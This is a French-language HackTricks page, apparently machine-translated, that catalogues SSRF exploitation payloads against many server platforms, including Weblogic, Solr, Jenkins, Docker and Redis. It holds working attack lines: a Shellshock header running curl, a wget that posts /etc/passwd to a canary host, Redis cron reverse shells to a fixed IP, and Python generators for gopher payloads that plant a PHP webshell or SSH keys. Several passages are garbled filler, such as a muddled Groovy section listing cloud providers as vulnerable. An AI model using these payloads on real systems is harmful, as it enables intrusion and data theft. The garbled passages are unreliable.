# Plateformes vuln√©rables √† SSRF

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Cette section a √©t√© copi√©e depuis [https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)

## Elasticsearch

**Port commun√©ment utilis√© : 9200**

Lorsque Elasticsearch est d√©ploy√© en interne, il ne n√©cessite g√©n√©ralement pas d'authentification.

Si vous avez un SSRF partiellement aveugle o√π vous pouvez d√©terminer le code d'√©tat, v√©rifiez si les points d'extr√©mit√© suivants renvoient un code 200 :
```http
/_cluster/health
/_cat/indices
/_cat/health
```
Si vous avez une SSRF aveugle o√π vous pouvez envoyer des requ√™tes POST, vous pouvez arr√™ter l'instance Elasticsearch en envoyant une requ√™te POST au chemin suivant :

Note : l'API `_shutdown` a √©t√© supprim√©e √† partir de la version 2.x d'Elasticsearch et ult√©rieure. Cela ne fonctionne que dans Elasticsearch 1.6 et versions ant√©rieures :
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
## Weblogic

**Ports couramment li√©s : 80, 443 (SSL), 7001, 8888**

**SSRF Canary : UDDI Explorer (CVE-2014-4210)**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
Cela fonctionne √©galement via GET :
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
Cet endpoint est √©galement vuln√©rable √† l'injection CRLF :
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
R√©sultera en la requ√™te suivante :
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRF Canary: CVE-2020-14883**

Extrait de [ici](https://forum.90sec.com/t/topic/1412).

Linux:
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
# Plateformes vuln√©rables √† SSRF

## Windows

Les serveurs Windows peuvent √©galement √™tre vuln√©rables aux attaques SSRF. Voici quelques-unes des plateformes couramment utilis√©es qui peuvent pr√©senter des vuln√©rabilit√©s SSRF sur des syst√®mes Windows :

- **IIS (Internet Information Services)** : Le serveur web IIS peut √™tre vuln√©rable aux attaques SSRF si une application web mal configur√©e permet √† un attaquant de sp√©cifier des URL arbitraires pour les requ√™tes sortantes.

- **.NET Framework** : Les applications bas√©es sur le framework .NET peuvent √™tre vuln√©rables aux attaques SSRF si elles utilisent des fonctionnalit√©s telles que `WebRequest` ou `HttpClient` pour effectuer des requ√™tes sortantes sans validation appropri√©e des URL.

- **Windows PowerShell** : Les scripts PowerShell peuvent √™tre vuln√©rables aux attaques SSRF si des entr√©es utilisateur sont utilis√©es pour construire des URL pour les requ√™tes sortantes sans validation ad√©quate.

Il est important de noter que la vuln√©rabilit√© SSRF peut exister sur d'autres plateformes Windows en fonction de la configuration et des applications utilis√©es. Il est donc essentiel de mener des tests de s√©curit√© appropri√©s pour identifier et corriger ces vuln√©rabilit√©s.
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
## Hashicorp Consul

**Ports couramment utilis√©s : 8500, 8501 (SSL)**

Le compte-rendu peut √™tre trouv√© [ici](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html).

## Shellshock

**Ports couramment utilis√©s : 80, 443 (SSL), 8080**

Pour tester efficacement Shellshock, vous devrez peut-√™tre ajouter un en-t√™te contenant la charge utile. Les chemins CGI suivants valent la peine d'√™tre essay√©s :

Liste courte des chemins CGI √† tester :

[Gist contenant les chemins](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4).

**SSRF Canary : Shellshock via User Agent**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
## Apache Druid

**Ports couramment utilis√©s : 80, 8080, 8888, 8082**

Consultez la r√©f√©rence de l'API pour Apache Druid [ici](https://druid.apache.org/docs/latest/operations/api-reference.html).

Si vous pouvez afficher le code d'√©tat, v√©rifiez les chemins suivants pour voir s'ils renvoient un code d'√©tat 200 :
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
## Plateformes vuln√©rables √† la SSRF (Server-Side Request Forgery)

Certaines plateformes peuvent √™tre vuln√©rables √† la SSRF (Server-Side Request Forgery) lorsqu'elles permettent aux utilisateurs de sp√©cifier des t√¢ches √† arr√™ter sans v√©rification ad√©quate. Cela peut conduire √† des attaques de devinette d'ID de t√¢che ou de nom de source de donn√©es.

### Exemple de vuln√©rabilit√©

```plaintext
GET /shutdown?task_id=1234 HTTP/1.1
Host: vulnerable-platform.com
```

Dans cet exemple, la plateforme vuln√©rable permet aux utilisateurs de sp√©cifier l'ID de la t√¢che √† arr√™ter via le param√®tre `task_id`. Cependant, aucune v√©rification n'est effectu√©e pour s'assurer que l'utilisateur a le droit d'arr√™ter cette t√¢che sp√©cifique. Cela peut permettre √† un attaquant de deviner des ID de t√¢che valides et d'arr√™ter des t√¢ches auxquelles il n'est pas autoris√©.

### Pr√©vention

Pour pr√©venir les attaques de devinette d'ID de t√¢che ou de nom de source de donn√©es, il est essentiel de mettre en place une v√©rification appropri√©e avant d'arr√™ter une t√¢che. Cela peut inclure l'authentification et l'autorisation pour s'assurer que l'utilisateur a les droits n√©cessaires pour effectuer cette action.

Il est √©galement recommand√© de limiter l'acc√®s aux fonctionnalit√©s de shutdown uniquement aux utilisateurs autoris√©s et de mettre en place des m√©canismes de journalisation pour d√©tecter toute activit√© suspecte.

### Conclusion

La SSRF peut √™tre exploit√©e sur des plateformes vuln√©rables qui permettent aux utilisateurs de sp√©cifier des t√¢ches √† arr√™ter sans v√©rification ad√©quate. Pour pr√©venir les attaques de devinette d'ID de t√¢che ou de nom de source de donn√©es, il est important de mettre en place des mesures de s√©curit√© appropri√©es, telles que l'authentification, l'autorisation et la journalisation.
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
Arr√™t des superviseurs sur les Apache Druid Overlords :
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
## Apache Solr

**Port commun√©ment utilis√© : 8983**

**SSRF Canary : Param√®tre Shards**

> Pour ajouter √† ce que shubham dit - la recherche de solr est relativement facile. Il existe un param√®tre shards= qui vous permet de rebondir SSRF vers SSRF pour v√©rifier si vous atteignez une instance solr √† l'aveugle.
>
> ‚Äî –•–∞–≤–∏–∂ –ù–∞—Ñ—Ñ–∏ ü•ï (@nnwakelam) [13 janvier 2021](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

Extrait [ici](https://github.com/veracode-research/solr-injection).
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRF Canary: Solr XXE (2017)**

[Apache Solr 7.0.1 XXE (Packetstorm)](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**RCE via dataImportHandler**

[Recherche sur RCE via dataImportHandler](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**Ports couramment li√©s : 80,443 (SSL)**

Extrait de cette recherche [ici](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce).

**SSRF Canary: XXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
# Plateformes vuln√©rables √† SSRF

Les plateformes suivantes sont connues pour √™tre vuln√©rables aux attaques SSRF (Server-Side Request Forgery) :

1. **AWS EC2 Metadata** : AWS EC2 Metadata permet aux instances EC2 d'acc√©der aux informations de configuration et de m√©tadonn√©es. Une SSRF peut √™tre utilis√©e pour acc√©der √† ces informations sensibles.

2. **Google Cloud Metadata** : Google Cloud Metadata fournit des informations sur les instances de Google Cloud. Une SSRF peut √™tre utilis√©e pour extraire ces informations.

3. **Azure Instance Metadata** : Azure Instance Metadata permet aux instances Azure d'acc√©der aux informations de configuration et de m√©tadonn√©es. Une SSRF peut √™tre utilis√©e pour acc√©der √† ces informations sensibles.

4. **DigitalOcean Metadata** : DigitalOcean Metadata fournit des informations sur les instances de DigitalOcean. Une SSRF peut √™tre utilis√©e pour extraire ces informations.

5. **OpenStack Metadata** : OpenStack Metadata permet aux instances OpenStack d'acc√©der aux informations de configuration et de m√©tadonn√©es. Une SSRF peut √™tre utilis√©e pour acc√©der √† ces informations sensibles.

6. **Kubernetes API** : Le Kubernetes API permet de g√©rer et de surveiller les clusters Kubernetes. Une SSRF peut √™tre utilis√©e pour acc√©der √† l'API et effectuer des actions non autoris√©es.

7. **Docker API** : L'API Docker permet de g√©rer les conteneurs Docker. Une SSRF peut √™tre utilis√©e pour acc√©der √† l'API et effectuer des actions non autoris√©es.

8. **Jenkins** : Jenkins est un outil d'int√©gration continue largement utilis√©. Une SSRF peut √™tre utilis√©e pour acc√©der √† des ressources internes ou pour ex√©cuter des commandes sur le serveur Jenkins.

9. **Rancher** : Rancher est une plateforme de gestion de conteneurs. Une SSRF peut √™tre utilis√©e pour acc√©der √† l'API Rancher et effectuer des actions non autoris√©es.

10. **GitLab** : GitLab est une plateforme de gestion de d√©p√¥ts Git. Une SSRF peut √™tre utilis√©e pour acc√©der √† des ressources internes ou pour ex√©cuter des commandes sur le serveur GitLab.

Il est important de noter que cette liste n'est pas exhaustive et qu'il existe d'autres plateformes vuln√©rables √† SSRF. Il est recommand√© de toujours effectuer une √©valuation de s√©curit√© approfondie pour identifier les vuln√©rabilit√©s sp√©cifiques √† votre environnement.
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
## Apache Struts

**Ports couramment utilis√©s : 80, 443 (SSL), 8080, 8443 (SSL)**

Extrait de [ici](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF Canary : Struts2-016** :

Ajoutez ceci √† la fin de chaque point de terminaison/URL interne que vous connaissez :
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
## JBoss

**Ports couramment utilis√©s : 80, 443 (SSL), 8080, 8443 (SSL)**

Extrait de [ici](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF Canary : D√©ploiement de WAR √† partir d'une URL**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
## Confluence

**Ports couramment utilis√©s : 80, 443 (SSL), 8080, 8443 (SSL)**

**SSRF Canary : Sharelinks (versions de Confluence publi√©es avant novembre 2016)**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRF Canary: iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Ticket de s√©curit√© Atlassian OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## Jira

**Ports couramment utilis√©s : 80, 443 (SSL), 8080, 8443 (SSL)**

**SSRF Canary : iconUriServlet - Jira < 7.3.5 (CVE-2017-9506)**

[Ticket de s√©curit√© Atlassian OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRF Canary: makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Ticket de s√©curit√© Atlassian JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
## Autres produits Atlassian

**Ports couramment utilis√©s : 80, 443 (SSL), 8080, 8443 (SSL)**

**SSRF Canary : iconUriServlet (CVE-2017-9506)**:

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[Ticket de s√©curit√© Atlassian OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## OpenTSDB

**Port commun√©ment utilis√© : 4242**

[OpenTSDB Ex√©cution de code √† distance](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRF Canary : curl via RCE**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 Ex√©cution de code √† distance](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF Canary: curl via RCE - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
## Jenkins

**Ports couramment utilis√©s : 80, 443 (SSL), 8080, 8888**

Excellent article [ici](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).

**SSRF Canary : CVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

Suivez les instructions ici pour obtenir une RCE via GET: [Hacking Jenkins Partie 2 - Abus de la m√©ta-programmation pour une RCE non authentifi√©e!](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**RCE via Groovy**

**RCE via Groovy**

Remote Code Execution (RCE) via Groovy is a Server-Side Request Forgery (SSRF) vulnerability that allows an attacker to execute arbitrary code on the server by exploiting the Groovy scripting engine.

### Vulnerable Platforms

The following platforms are known to be vulnerable to RCE via Groovy:

- Workspace
- AWS EC2
- GCP Compute Engine
- Azure Virtual Machines

### Exploitation

To exploit this vulnerability, an attacker can craft a malicious request that triggers the server to execute Groovy code. This can be achieved by injecting a Groovy script into a vulnerable parameter, such as a URL or a file path.

Once the server processes the request, the injected Groovy code will be executed, allowing the attacker to perform various actions on the server, such as reading or modifying files, executing system commands, or even gaining full control over the server.

### Mitigation

To mitigate the risk of RCE via Groovy, it is recommended to:

- Keep all software and libraries up to date, as newer versions may include security patches.
- Validate and sanitize user input to prevent malicious code injection.
- Implement strict access controls and permissions to limit the impact of a potential exploit.
- Use a web application firewall (WAF) to detect and block malicious requests.
- Regularly monitor and review server logs for any suspicious activity.

By following these best practices, you can reduce the likelihood of RCE via Groovy and enhance the security of your server.
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
## Tableau de bord Hystrix

**Ports couramment li√©s : 80, 443 (SSL), 8080**

Spring Cloud Netflix, versions 2.2.x ant√©rieures √† 2.2.4, versions 2.1.x ant√©rieures √† 2.1.6.

**SSRF Canary : CVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
## W3 Total Cache

**Ports couramment utilis√©s : 80,443 (SSL)**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF Canary : CVE-2019-6715**

Cela doit √™tre une requ√™te PUT :
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRF Canary**

L'avis concernant cette vuln√©rabilit√© a √©t√© publi√© ici: [Vuln√©rabilit√© SSRF de W3 Total Cache](https://klikki.fi/adv/w3\_total\_cache.html)

Ce code PHP g√©n√©rera une charge utile pour votre h√¥te SSRF Canary (remplacez `url` par votre h√¥te canary):
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
## Docker

**Ports couramment li√©s : 2375, 2376 (SSL)**

Si vous avez une SSRF partiellement aveugle, vous pouvez utiliser les chemins suivants pour v√©rifier la pr√©sence de l'API de Docker :
```bash
/containers/json
/secrets
/services
```
**RCE via l'ex√©cution d'une image Docker arbitraire**

SSRF vulnerabilities can sometimes lead to Remote Code Execution (RCE) if the target server allows the execution of arbitrary Docker images. In this scenario, an attacker can exploit the SSRF vulnerability to make the server pull and run a malicious Docker image, which can result in the execution of arbitrary code on the target system.

To exploit this vulnerability, the attacker needs to identify a SSRF vulnerability that allows them to control the URL parameter used to fetch the Docker image. The attacker can then provide a URL that points to a malicious Docker image hosted on a remote server.

When the server processes the SSRF request and attempts to fetch the Docker image, it will pull the malicious image and execute it. This can lead to the execution of arbitrary code with the privileges of the Docker container.

To prevent this type of attack, it is important to properly validate and sanitize user input, especially when it is used to fetch and execute external resources. Additionally, restricting the server's access to external resources and implementing proper access controls can help mitigate the risk of SSRF vulnerabilities leading to RCE via Docker images.
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
Remplacez alpine par une image arbitraire que vous souhaitez ex√©cuter dans le conteneur Docker.

## Gitlab Prometheus Redis Exporter

**Ports couramment li√©s : 9121**

Cette vuln√©rabilit√© affecte les instances Gitlab ant√©rieures √† la version 13.1.1. Selon la [documentation de Gitlab](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus), `Prometheus et ses exportateurs sont activ√©s par d√©faut √† partir de GitLab 9.0.`

Ces exportateurs fournissent une excellente m√©thode pour qu'un attaquant pivote et attaque d'autres services en utilisant CVE-2020-13379. L'un des exportateurs qui est facilement exploit√© est l'exportateur Redis.

Le point de terminaison suivant permettra √† un attaquant de r√©cup√©rer toutes les cl√©s du serveur Redis fournies via le param√®tre cible :
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
**Possible via Gopher**

## Redis

**Port commun√©ment utilis√© : 6379**

Lecture recommand√©e :

* [Essayer de pirater Redis via des requ√™tes HTTP](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [Exploits SSRF contre Redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**RCE via Cron** - [Surfaces d'attaque Gopher](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
Gopher:

Gopher est un protocole de recherche d'informations sur Internet qui permet d'acc√©der √† des ressources textuelles organis√©es de mani√®re hi√©rarchique. Il est souvent utilis√© pour acc√©der √† des documents et des fichiers sur des serveurs distants. Les attaquants peuvent exploiter les vuln√©rabilit√©s SSRF (Server-Side Request Forgery) pour envoyer des requ√™tes Gopher malveillantes √† des serveurs internes, ce qui peut entra√Æner des fuites d'informations sensibles ou des attaques sur d'autres syst√®mes. Les plateformes vuln√©rables √† SSRF incluent certaines versions de PHP, Ruby on Rails, Java et d'autres frameworks et biblioth√®ques populaires. Les d√©veloppeurs doivent prendre des mesures pour s√©curiser leurs applications et √©viter les vuln√©rabilit√©s SSRF.
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**RCE via Shell Upload (PHP)** - [R√©sum√© de l'exploitation de Redis Getshell](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**RCE via authorized\_keys** - [R√©sum√© de la prise de contr√¥le de Redis](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**RCE sur GitLab via le protocole Git**

Excellent article de Liveoverflow [ici](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/).

